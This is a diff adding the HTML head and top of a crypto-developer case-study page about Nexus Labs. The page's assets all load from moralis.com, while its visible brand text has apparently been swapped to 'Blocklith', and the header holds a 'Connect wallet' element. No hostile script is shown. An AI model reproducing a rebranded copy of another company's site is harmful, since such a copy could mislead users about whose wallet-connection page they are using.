+      href="https://moralis.com/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=i4r/q2lNz8dEryc"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="ecs-styles-css"
+      href="https://moralis.com/wp-content/plugins/ele-custom-skin/assets/css/ecs-style.css?ver=3.1.9"
+      media="all"
+    />
+    <link
+      rel="stylesheet"
+      id="elementor-post-153553-css"
+      href="https://moralis.com/wp-content/uploads/elementor/css/post-153553.css?ver=1746139644"
+      media="all"
+    />
+    <script
+      src="https://moralis.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1"
+      id="jquery-core-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.29.2"
+      id="font-awesome-4-shim-js"
+    ></script>
+    <script id="ecs_ajax_load-js-extra">
+      var ecs_ajax_params = {
+        ajaxurl: "https:\/\/moralis.com\/wp-admin\/admin-ajax.php",
+        posts:
+          '{"page":0,"case-studies":"nexus-labs","post_type":"case-studies","name":"nexus-labs","error":"","m":"","p":0,"post_parent":"","subpost":"","subpost_id":"","attachment":"","attachment_id":0,"pagename":"","page_id":0,"second":"","minute":"","hour":"","day":0,"monthnum":0,"year":0,"w":0,"category_name":"","tag":"","cat":"","tag_id":"","author":"","author_name":"","feed":"","tb":"","paged":0,"meta_key":"","meta_value":"","preview":"","s":"","sentence":"","title":"","fields":"all","menu_order":"","embed":"","category__in":[],"category__not_in":[],"category__and":[],"post__in":[],"post__not_in":[],"post_name__in":[],"tag__in":[],"tag__not_in":[],"tag__and":[],"tag_slug__in":[],"tag_slug__and":[],"post_parent__in":[],"post_parent__not_in":[],"author__in":[],"author__not_in":[],"search_columns":[],"ignore_sticky_posts":false,"suppress_filters":false,"cache_results":true,"update_post_term_cache":true,"update_menu_item_cache":false,"lazy_load_term_meta":true,"update_post_meta_cache":true,"posts_per_page":12,"nopaging":false,"comments_per_page":"50","no_found_rows":false,"order":"DESC"}',
+      };
+    </script>
+    <script
+      src="https://moralis.com/wp-content/plugins/ele-custom-skin/assets/js/ecs_ajax_pagination.js?ver=3.1.9"
+      id="ecs_ajax_load-js"
+    ></script>
+    <script
+      src="https://moralis.com/wp-content/plugins/ele-custom-skin/assets/js/ecs.js?ver=3.1.9"
+      id="ecs-script-js"
+    ></script>
+    <script>
+      function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2 && typeof parts != "undefined") {
+          return parts.pop().split(";").shift();
+        }
+      }
+
+      const checkUserIdCookie = () => {
+        const userIdCookie = getCookie("ajs_user_id");
+        if (!userIdCookie) return;
+        if (!userIdCookie.startsWith("o-")) return;
+
+        localStorage.removeItem("ajs_user_id");
+        // cookie is set incorrectly to org ID
+        // remove it by setting its expiry to 1970
+        document.cookie =
+          "ajs_user_id=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.moralis.io";
+      };
+      checkUserIdCookie();
+    </script>
+    <style>
+      *:not(.elementor-editor-active) .plus-conditions--hidden {
+        display: none;
+      }
+    </style>
+    <meta
+      name="generator"
+      content="Elementor 3.29.2; features: additional_custom_breakpoints, e_local_google_fonts; settings: css_print_method-external, google_font-enabled, font_display-swap"
+    />
+    <style>
+      .e-con.e-parent:nth-of-type(n + 4):not(.e-lazyloaded):not(.e-no-lazyload),
+      .e-con.e-parent:nth-of-type(n + 4):not(.e-lazyloaded):not(.e-no-lazyload)
+        * {
+        background-image: none !important;
+      }
+      @media screen and (max-height: 1024px) {
+        .e-con.e-parent:nth-of-type(n + 3):not(.e-lazyloaded):not(
+            .e-no-lazyload
+          ),
+        .e-con.e-parent:nth-of-type(n + 3):not(.e-lazyloaded):not(
+            .e-no-lazyload
+          )
+          * {
+          background-image: none !important;
+        }
+      }
+      @media screen and (max-height: 640px) {
+        .e-con.e-parent:nth-of-type(n + 2):not(.e-lazyloaded):not(
+            .e-no-lazyload
+          ),
+        .e-con.e-parent:nth-of-type(n + 2):not(.e-lazyloaded):not(
+            .e-no-lazyload
+          )
+          * {
+          background-image: none !important;
+        }
+      }
+    </style>
+    <link
+      rel="icon"
+      href="https://moralis.com/wp-content/uploads/2025/06/cropped-Moralis-32x32.png"
+      sizes="32x32"
+    />
+    <link
+      rel="icon"
+      href="https://moralis.com/wp-content/uploads/2025/06/cropped-Moralis-192x192.png"
+      sizes="192x192"
+    />
+    <link
+      rel="apple-touch-icon"
+      href="https://moralis.com/wp-content/uploads/2025/06/cropped-Moralis-180x180.png"
+    />
+    <meta
+      name="msapplication-TileImage"
+      content="https://moralis.com/wp-content/uploads/2025/06/cropped-Moralis-270x270.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="57x57"
+      href="/favicon/moralis-icon-57x57.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="60x60"
+      href="/favicon/moralis-icon-60x60.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="72x72"
+      href="/favicon/moralis-icon-72x72.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="76x76"
+      href="/favicon/moralis-icon-76x76.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="114x114"
+      href="/favicon/moralis-icon-114x114.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="120x120"
+      href="/favicon/moralis-icon-120x120.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="144x144"
+      href="/favicon/moralis-icon-144x144.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="152x152"
+      href="/favicon/moralis-icon-152x152.png"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="/favicon/moralis-icon-180x180.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="192x192"
+      href="/favicon/moralis-icon-192x192.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="/favicon/moralis-icon-32x32.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="96x96"
+      href="/favicon/moralis-icon-96x96.png"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="/favicon/moralis-icon-16x16.png"
+    />
+    <link rel="manifest" href="/favicon/manifest.json" />
+    <meta name="msapplication-TileColor" content="#ffffff" />
+    <meta
+      name="msapplication-TileImage"
+      content="/favicon/moralis-icon-144x144.png"
+    />
+
+    <!-- Google Tag Manager -->
+    <script src="https://moralis.com/wp-content/themes/hello-elementor-child/components/m_header-scripts_v3.js"></script>
+    <!-- End Google Tag Manager -->
+    <meta
+      name="google-site-verification"
+      content="QZyujgj641snkG6ghbv9VJq5lDJkTkino1N4bIZmSos"
+    />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="profile" href="http://gmpg.org/xfn/11" />
+    <script
+      type="text/javascript"
+      async=""
+      src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/358563412/?random=1753741002890&amp;cv=11&amp;fst=1753741002890&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be57p1v875844535z89175371500za200zd875844535&amp;gcd=13t3t3t3t5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104630779~104630781~104684208~104684211~104948813&amp;u_w=800&amp;u_h=600&amp;url=https%3A%2F%2Fmoralis.com%2Fcase-studies%2Fnexus-labs%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=How%20Nexus%20Labs%20Saved%203%20Months%20of%20Work%20with%20Moralis&amp;did=dMmY1Mm&amp;gdid=dMmY1Mm&amp;npa=0&amp;auid=1273882784.1753741003&amp;uaa=x86&amp;uab=&amp;uafvl=&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0&amp;uaw=0&amp;fledge=1&amp;_tu=CA&amp;data=event%3Dgtag.config&amp;rfmt=3&amp;fmt=4"
+    ></script>
+    <script
+      type="text/javascript"
+      async=""
+      src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/358563412/?random=1753741002892&amp;cv=11&amp;fst=1753741002892&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be57p1v875844535z89175371500za200zd875844535&amp;gcd=13t3t3t3t5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104630779~104630781~104684208~104684211~104948813&amp;u_w=800&amp;u_h=600&amp;url=https%3A%2F%2Fmoralis.com%2Fcase-studies%2Fnexus-labs%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=How%20Nexus%20Labs%20Saved%203%20Months%20of%20Work%20with%20Moralis&amp;did=dMmY1Mm&amp;gdid=dMmY1Mm&amp;npa=0&amp;auid=1273882784.1753741003&amp;uaa=x86&amp;uab=&amp;uafvl=&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0&amp;uaw=0&amp;fledge=1&amp;_tu=CA&amp;data=ads_data_redaction%3Dfalse&amp;rfmt=3&amp;fmt=4"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.cookie-script.com/iabtcf/2.2/sdk_cmp.js"
+    ></script>
+    <script
+      src="https://bat.bing.com/p/action/148015318.js"
+      type="text/javascript"
+      async=""
+      data-ueto="ueto_1377b81794"
+    ></script>
+    <script
+      async=""
+      src="https://script.hotjar.com/modules.a3cb6dcf71aec7e1a87f.js"
+      charset="utf-8"
+    ></script>
+  </head>
+  <body
+    class="wp-singular case-studies-template-default single single-case-studies postid-146461 single-format-standard wp-custom-logo wp-embed-responsive wp-theme-hello-elementor wp-child-theme-hello-elementor-child hello-elementor-default elementor-default elementor-kit-6 elementor-page elementor-page-146461 e--ua-isTouchDevice e--ua-blink e--ua-chrome e--ua-webkit"
+    data-elementor-device-mode="mobile"
+  >
+    <!-- Google Tag Manager (noscript) -->
+    <noscript
+      ><iframe
+        src="https://www.googletagmanager.com/ns.html?id=GTM-T5T6X6FS"
+        height="0"
+        width="0"
+        style="display: none; visibility: hidden"
+      ></iframe
+    ></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <div
+      data-elementor-type="header"
+      data-elementor-id="144196"
+      class="elementor elementor-144196 elementor-location-header"
+      data-elementor-post-type="elementor_library"
+    >
+      <div
+        data-element_type="container"
+        id="m_header"
+        data-settings='{"sticky_effects_offset":20,"sticky":"top","sticky_effects_offset_mobile":60,"sticky_on":["desktop","tablet","mobile"],"sticky_offset":0,"sticky_anchor_link_offset":0}'
+        style="
+          position: fixed;
+          width: 100%;
+          margin-top: 0px;
+          margin-bottom: 0px;
+          top: 0px;
+        "
+      >
+        <div
+          class="elementor-element elementor-element-16a6d58 elementor-widget__width-inherit elementor-widget elementor-widget-shortcode"
+          data-id="16a6d58"
+          data-element_type="widget"
+          data-widget_type="shortcode.default"
+        >
+          <div class="elementor-widget-container">
+            <div class="elementor-shortcode">
+              <link
+                rel="stylesheet"
+                href="https://moralis.com/wp-content/themes/hello-elementor-child/nav/nav_2025_v19.min.css"
+              />
+              <div id="m_header_nav">
+                <div class="m_header-nav-row m_header-nav-row-main">
+                  <div class="">
+                    <a href="/" aria-label=" Blocklith Logo">
+                      <img
+                        loading="lazy"
+                        src="https://moralis.com/wp-content/uploads/2024/09/Moralis-Developers-Logo-Light.webp"
+                        height="35"
+                        width="143"
+                        alt=" Blocklith Logo"
+                        title=" Blocklith Logo"
+                      />
+                    </a>
+                  </div>
+
+                  <div class="m_nav-container m_menu-desktop">
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_products"
+                    >
+                      Products <i class="fa fa-angle-down"></i>
+                    </span>
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_chains"
+                    >
+                      Chains <i class="fa fa-angle-down"></i>
+                    </span>
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_solutions"
+                    >
+                      Solutions <i class="fa fa-angle-down"></i>
+                    </span>
+                  </div>
+
+                  <div class="m_nav-links" style="width: auto; padding: 0">
+                    <a
+                      id="m_register"
+                      style="width: auto; padding: 10; margin-right: 5"
+                      >Connect wallet</a
+                    >
+                    <span id="m_mobileTrigger"></span>
+                  </div>
+                </div>
+                <div class="m_header-nav-row m_header-nav-row-dropdowns">
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_products"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_chains"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_solutions"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_enterprise"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_resources"
+                  ></div>
+
+                  <div
+                    class="m_nav-container m_menu-mobile"
+                    id="m_mobile_dropdown"
+                  >
+                    <div
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_mobile_menu_products"
+                    >
+                      Products <i class="fa fa-angle-down"></i>
+                    </div>
+                    <div
+                      class="m_dropdown-content m_dropdown-content-mobile"
+                      id="m_mobile_dropdown_products"
+                    ></div>
+
+                    <div
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_mobile_menu_chains"
+                    >
+                      Chains <i class="fa fa-angle-down"></i>
+                    </div>
+                    <div
+                      class="m_dropdown-content m_dropdown-content-mobile"
+                      id="m_mobile_dropdown_chains"
+                    ></div>
+
+                    <div
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_mobile_menu_solutions"
+                    >
+                      Solutions <i class="fa fa-angle-down"></i>
+                    </div>
+                    <div
+                      class="m_dropdown-content m_dropdown-content-mobile"
+                      id="m_mobile_dropdown_solutions"
+                    ></div>
+
+                    <div
+                      class="m_dropdown-content m_dropdown-content-mobile"
+                      id="m_mobile_dropdown_resources"
+                    ></div>
+                  </div>
+                </div>
+              </div>
+              <script src="https://moralis.com/wp-content/themes/hello-elementor-child/nav/nav_2025_v50.min.js"></script>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div
+        class="elementor-element elementor-element-c7ac6e1 e-con-full e-flex e-con e-parent dark e-lazyloaded elementor-sticky elementor-sticky__spacer"
+        data-id="c7ac6e1"
+        data-element_type="container"
+        id="m_header"
+        data-settings='{"sticky_effects_offset":20,"sticky":"top","sticky_effects_offset_mobile":60,"sticky_on":["desktop","tablet","mobile"],"sticky_offset":0,"sticky_anchor_link_offset":0}'
+        style="
+          visibility: hidden;
+          transition: none;
+          animation: auto ease 0s 1 normal none running none;
+        "
+      >
+        <div
+          class="elementor-element elementor-element-16a6d58 elementor-widget__width-inherit elementor-widget elementor-widget-shortcode"
+          data-id="16a6d58"
+          data-element_type="widget"
+          data-widget_type="shortcode.default"
+        >
+          <div class="elementor-widget-container">
+            <div class="elementor-shortcode">
+              <link
+                rel="stylesheet"
+                href="https://moralis.com/wp-content/themes/hello-elementor-child/nav/nav_2025_v19.min.css"
+              />
+              <div id="m_header_nav">
+                <div class="m_header-nav-row m_header-nav-row-main">
+                  <div class="m_nav-logo">
+                    <a
+                      href="/"
+                      aria-label=" Blocklith Logo"
+                      class="m_header-logo-link"
+                    >
+                      <img
+                        loading="lazy"
+                        src="https://moralis.com/wp-content/uploads/2024/09/Moralis-Developers-Logo-Light.webp"
+                        height="35"
+                        width="143"
+                        alt=" Blocklith Logo"
+                        title=" Blocklith Logo"
+                      />
+                    </a>
+                  </div>
+
+                  <div class="m_nav-container m_menu-desktop">
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_products"
+                    >
+                      Products <i class="fa fa-angle-down"></i>
+                    </span>
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_chains"
+                    >
+                      Chains <i class="fa fa-angle-down"></i>
+                    </span>
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_solutions"
+                    >
+                      Solutions <i class="fa fa-angle-down"></i>
+                    </span>
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_enterprise"
+                    >
+                      Enterprise <i class="fa fa-angle-down"></i>
+                    </span>
+                    <span
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_dropdown_menu_resources"
+                    >
+                      Resources <i class="fa fa-angle-down"></i>
+                    </span>
+                  </div>
+
+                  <div class="" style="width: auto; padding: 0">
+                    Connect wallet
+                  </div>
+                  <span id="m_mobileTrigger"></span>
+                </div>
+                <div class="m_header-nav-row m_header-nav-row-dropdowns">
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_products"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_chains"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_solutions"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_enterprise"
+                  ></div>
+                  <div
+                    class="m_dropdown-content m_dropdown-content-desktop"
+                    id="m_desktop_dropdown_resources"
+                  ></div>
+
+                  <div
+                    class="m_nav-container m_menu-mobile"
+                    id="m_mobile_dropdown"
+                  >
+                    <div
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_mobile_menu_products"
+                    >
+                      Products <i class="fa fa-angle-down"></i>
+                    </div>
+                    <div
+                      class="m_dropdown-content m_dropdown-content-mobile"
+                      id="m_mobile_dropdown_products"
+                    ></div>
+
+                    <div
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_mobile_menu_chains"
+                    >
+                      Chains <i class="fa fa-angle-down"></i>
+                    </div>
+                    <div
+                      class="m_dropdown-content m_dropdown-content-mobile"
+                      id="m_mobile_dropdown_chains"
+                    ></div>
+
+                    <div
+                      class="m_menu-option m_menu-dropdown"
+                      id="m_mobile_menu_solutions"
+                    >
+                      Solutions <i class="fa fa-angle-down"></i>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <!-- <script src="https://moralis.com/wp-content/themes/hello-elementor-child/nav/nav_2025_v50.min.js"></script> -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <main
+      id="content"
+      class="site-main post-146461 case-studies type-case-studies status-publish format-standard has-post-thumbnail hentry"
+    >
+      <div class="page-content">
+        <div
+          data-elementor-type="wp-post"
+          data-elementor-id="146461"
+          class="elementor elementor-146461"
+          data-elementor-post-type="case-studies"
+        >
+          <div
+            class="elementor-element elementor-element-0d51a22 e-flex e-con-boxed e-con e-parent e-lazyloaded"
+            data-id="0d51a22"
+            data-element_type="container"
+            data-settings='{"background_background":"classic"}'
+          >
+            <div class="e-con-inner">
+              <div
+                class="elementor-element elementor-element-428cc4f e-con-full e-flex e-con e-child"
+                data-id="428cc4f"
+                data-element_type="container"
+              >
+                <div
+                  class="elementor-element elementor-element-ac98e7c elementor-widget__width-inherit elementor-widget elementor-widget-image"
+                  data-id="ac98e7c"
+                  data-element_type="widget"
+                  data-widget_type="image.default"
+                >
+                  <div class="elementor-widget-container">
+                    <img
+                      decoding="async"
+                      width="150"
+                      height="149"
+                      src="https://moralis.com/wp-content/uploads/2024/09/Nexus-Labs-Logo-Simple-150x149.png"
+                      class="attachment-thumbnail size-thumbnail wp-image-146471"
+                      alt=""
+                    />
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-c7f2c45 elementor-widget__width-inherit elementor-widget elementor-widget-heading"
+                  data-id="c7f2c45"
+                  data-element_type="widget"
+                  data-widget_type="heading.default"
+                >
+                  <div class="elementor-widget-container">
+                    <h1 class="elementor-heading-title elementor-size-default">
+                      How Nexus Labs Saved 3 Months of Work with Blocklith
+                    </h1>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-40b5bc5 elementor-widget__width-inherit elementor-widget elementor-widget-heading"
+                  data-id="40b5bc5"
+                  data-element_type="widget"
+                  data-widget_type="heading.default"
+                >
+                  <div class="elementor-widget-container">
+                    <p class="elementor-heading-title elementor-size-default">
+                      Nexus Labs is a Web3 platform providing investors with
+                      multi-asset portfolio tracking, Web3 data analytics, and
+                      launchpad services, empowering users to navigate the
+                      complexities of the Web3 ecosystem.
+                    </p>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-80df494 elementor-widget-mobile__width-inherit elementor-widget elementor-widget-counter"
+                  data-id="80df494"
+                  data-element_type="widget"
+                  data-widget_type="counter.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-counter">
+                      <div class="elementor-counter-title">
+                        of Work Eliminated
+                      </div>
+                      <div class="elementor-counter-number-wrapper">
+                        <span class="elementor-counter-number-prefix"></span>
+                        <span
+                          class="elementor-counter-number"
+                          data-duration="300"
+                          data-to-value="3"
+                          data-from-value="0"
+                          data-delimiter=","
+                          >3</span
+                        >
+                        <span class="elementor-counter-number-suffix">
+                          Months</span
+                        >
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-8d20cb1 elementor-widget-mobile__width-initial elementor-widget elementor-widget-heading"
+                  data-id="8d20cb1"
+                  data-element_type="widget"
+                  data-widget_type="heading.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-heading-title elementor-size-default">
+                      <span class="elementor-counter-number">Cross-Chain</span>
+                      <span class="elementor-counter-title">Support</span>
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-61c9dbc elementor-widget__width-inherit elementor-widget-tablet__width-auto elementor-widget-mobile__width-inherit elementor-widget elementor-widget-counter"
+                  data-id="61c9dbc"
+                  data-element_type="widget"
+                  data-widget_type="counter.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-counter">
+                      <div class="elementor-counter-title">Saved</div>
+                      <div class="elementor-counter-number-wrapper">
+                        <span class="elementor-counter-number-prefix"></span>
+                        <span
+                          class="elementor-counter-number"
+                          data-duration="200"
+                          data-to-value="2"
+                          data-from-value="0"
+                          data-delimiter=","
+                          >0</span
+                        >
+                        <span class="elementor-counter-number-suffix">
+                          Full-Time Positions</span
+                        >
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-66a5a64 e-con-full elementor-hidden-tablet elementor-hidden-mobile e-flex e-con e-child"
+                data-id="66a5a64"
+                data-element_type="container"
+              >
+                <div
+                  class="elementor-element elementor-element-c2a576c elementor-widget elementor-widget-html"
+                  data-id="c2a576c"
+                  data-element_type="widget"
+                  data-widget_type="html.default"
+                >
+                  <div class="elementor-widget-container">
+                    <img
+                      decoding="async"
+                      width="640"
+                      height="621.714"
+                      src="https://moralis.com/wp-content/uploads/2024/09/moralis_nexus_fold.webp"
+                      alt="Recap case study hero image showing how Blocklith helped reduce operational costs by 80% with blockchain solutions"
+                      aria-label="Hero image for Recap Blocklith Case Study - Cost Reduction with Blockchain Solutions"
+                    />
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div
+            class="elementor-element elementor-element-f70fc4d e-flex e-con-boxed e-con e-parent"
+            data-id="f70fc4d"
+            data-element_type="container"
+          >
+            <div class="e-con-inner">
+              <div
+                class="elementor-element elementor-element-0a4eb34 elementor-position-left elementor-vertical-align-middle quoteBox elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box"
+                data-id="0a4eb34"
+                data-element_type="widget"
+                data-widget_type="icon-box.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-icon-box-wrapper">
+                    <div class="elementor-icon-box-icon">
+                      <span class="elementor-icon">
+                        <svg
+                          xmlns="http://www.w3.org/2000/svg"
+                          width="32"
+                          height="22"
+                          viewBox="0 0 32 22"
+                          fill="none"
+                        >
+                          <g clip-path="url(#clip0_3826_461)">
+                            <path
+                              d="M31.9935 7.8354C31.9935 3.70517 28.6387 0.350342 24.5085 0.350342C20.3783 0.350342 17.0234 3.70517 17.0234 7.8354C17.0234 11.9656 20.3783 15.3205 24.5085 15.3205C25.2206 15.3205 25.9011 15.1939 26.5499 15.004C25.5371 16.7447 23.8913 18.0739 21.217 18.0739C20.1567 18.0739 19.2864 18.9443 19.2864 20.0045C19.2864 21.0648 20.1567 21.9352 21.217 21.9352C27.8633 21.9352 31.9935 16.539 31.9935 7.8354Z"
+                              fill="#99D3FF"
+                            ></path>
+                            <path
+                              d="M14.9937 7.8354C14.9937 3.70517 11.6389 0.350342 7.50869 0.350342C3.37846 0.350342 0.0078125 3.70517 0.0078125 7.8354C0.0078125 11.9656 3.36264 15.3205 7.49287 15.3205C8.20498 15.3205 8.88544 15.1939 9.53425 15.004C8.52147 16.7447 6.87571 18.0739 4.20134 18.0739C3.14109 18.0739 2.27074 18.9443 2.27074 20.0045C2.27074 21.0648 3.14109 21.9352 4.20134 21.9352C10.8477 21.9352 14.9779 16.539 14.9779 7.8354H14.9937Z"
+                              fill="#99D3FF"
+                            ></path>
+                          </g>
+                          <defs>
+                            <clipPath id="clip0_3826_461">
+                              <rect
+                                width="31.9816"
+                                height="21.6006"
+                                fill="white"
+                                transform="translate(0.0078125 0.350342)"
+                              ></rect>
+                            </clipPath>
+                          </defs>
+                        </svg>
+                      </span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-90df4cd elementor-widget elementor-widget-heading"
+                data-id="90df4cd"
+                data-element_type="widget"
+                data-widget_type="heading.default"
+              >
+                <div class="elementor-widget-container">
+                  <p class="elementor-heading-title elementor-size-default">
+                    Blocklith’ comprehensive API suite has been instrumental in
+                    the development of our multi-asset tracker, enabling us to
+                    deliver unparalleled data accuracy and reliability across
+                    multiple blockchain networks.
+                  </p>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-9e16cc0 elementor-author-box--layout-image-left elementor-author-box--align-left elementor-author-box--image-valign-middle elementor-widget elementor-widget-author-box"
+                data-id="9e16cc0"
+                data-element_type="widget"
+                data-widget_type="author-box.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-author-box">
+                    <div class="elementor-author-box__avatar">
+                      <img
+                        decoding="async"
+                        src="https://moralis.com/wp-content/uploads/2024/09/Nexus-Labs-Thumbnail.avif"
+                        alt='Picture of <span class="title">Head of Product</span> Joris Langewouters'
+                        loading="lazy"
+                      />
+                    </div>
+
+                    <div class="elementor-author-box__text">
+                      <div>
+                        <div class="elementor-author-box__name">
+                          <span class="title">Head of Product</span> Joris
+                          Langewouters
+                        </div>
+                      </div>
+
+                      <div class="elementor-author-box__bio">
+                        <p>Nexus Labs</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-a644015 elementor-hidden-mobile elementor-widget-divider--view-line elementor-widget elementor-widget-divider"
+                data-id="a644015"
+                data-element_type="widget"
+                data-widget_type="divider.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-divider">
+                    <span class="elementor-divider-separator"> </span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div
+            class="elementor-element elementor-element-69ebe09 e-flex e-con-boxed e-con e-parent"
+            data-id="69ebe09"
+            data-element_type="container"
+          >
+            <div class="e-con-inner">
+              <div
+                class="elementor-element elementor-element-b8fa6ea e-con-full elementor-hidden-mobile e-flex e-con e-child"
+                data-id="b8fa6ea"
+                data-element_type="container"
+              >
+                <div
+                  class="elementor-element elementor-element-0942c5b elementor-widget elementor-widget-heading"
+                  data-id="0942c5b"
+                  data-element_type="widget"
+                  data-widget_type="heading.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-heading-title elementor-size-default">
+                      <a
+                        href="https://www.nexuslabs.gg/"
+                        target="_blank"
+                        rel="nofollow"
+                        >https://www.nexuslabs.gg/</a
+                      >
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-ddc7fed elementor-hidden-tablet elementor-widget elementor-widget-icon-box"
+                  data-id="ddc7fed"
+                  data-element_type="widget"
+                  data-widget_type="icon-box.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-icon-box-wrapper">
+                      <div class="elementor-icon-box-content">
+                        <div class="elementor-icon-box-title">
+                          <span> Head of Product at Nexus Labs </span>
+                        </div>
+
+                        <p class="elementor-icon-box-description">
+                          Joris Langewouters
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-1e9c879 elementor-widget-divider--view-line elementor-widget elementor-widget-divider"
+                  data-id="1e9c879"
+                  data-element_type="widget"
+                  data-widget_type="divider.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-divider">
+                      <span class="elementor-divider-separator"> </span>
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-dd966a3 elementor-widget-tablet__width-initial elementor-widget elementor-widget-icon-box"
+                  data-id="dd966a3"
+                  data-element_type="widget"
+                  data-widget_type="icon-box.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-icon-box-wrapper">
+                      <div class="elementor-icon-box-content">
+                        <h2 class="elementor-icon-box-title">
+                          <span> CHALLENGE </span>
+                        </h2>
+
+                        <p class="elementor-icon-box-description">
+                          Nexus Labs needed to launch a multi-asset tracker
+                          capable of delivering accurate, real-time data across
+                          multiple blockchain networks, including Ethereum,
+                          Polygon, and Avalanche. The solution required seamless
+                          management of ERC20 tokens and native balances, along
+                          with scalability and long-term reliability.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-352ae3e elementor-widget-tablet__width-initial elementor-widget elementor-widget-icon-box"
+                  data-id="352ae3e"
+                  data-element_type="widget"
